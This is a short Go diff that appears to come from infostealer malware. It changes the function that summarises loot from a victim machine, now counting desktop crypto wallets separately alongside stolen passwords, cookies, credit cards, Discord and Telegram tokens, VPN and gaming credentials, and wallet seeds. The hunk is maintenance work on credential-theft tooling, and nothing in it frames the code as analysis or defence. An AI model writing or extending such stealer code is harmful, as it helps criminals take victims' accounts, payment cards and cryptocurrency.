@@ -91,9 +91,19 @@ func harvestSummary(p *harvestPayload) string {
 		p.Hostname, p.OS, p.Arch, p.PublicIP, p.CountryCode, p.Country, p.MacUser,
 		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
 		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
-		len(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
+		countDesktopWallets(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
 		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
 	)
+}
+
+func countDesktopWallets(wallets []recovery.WalletResult) int {
+	n := 0
+	for _, w := range wallets {
+		if w.Type == "desktop" {
+			n++
+		}
+	}
+	return n
 }
 
 func countGaming(g *recovery.GamingResult) int {
